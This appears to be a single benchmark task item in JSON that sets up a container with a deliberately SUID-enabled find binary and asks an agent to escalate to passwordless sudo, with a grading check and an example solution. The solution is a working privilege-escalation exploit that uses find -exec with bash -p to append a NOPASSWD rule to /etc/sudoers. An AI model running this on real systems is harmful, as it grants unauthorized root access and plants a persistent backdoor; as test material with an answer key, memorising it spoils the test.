[
    {
        "description": "You are a common user. There's a vulnerability in the system (Hint: related to SUID). Find it and exploit it so that you can execute sudo without password",
        "create": {
            "init": {
                "code": "apt update && apt install sudo -y && useradd -s /bin/bash -d /home/hansen -m hansen && chmod u+s /usr/bin/find && su - hansen"
            }
        },
        "evaluation": {
            "check": {
                "code": "(whoami && sudo whoami) | if [ \"$(cat -)\" = \"hansen\"$'\\n'\"root\" ]; then exit 0; else exit 1; fi"
            },
            "example": {
                "code": "find / -user root -perm -4000 -print 2>/dev/null; cd ~ && touch tmp && find tmp -exec /bin/bash -p -c \"echo 'hansen ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers\" \\;"
            }
        },
        "labels": ["permission"]
    }
]
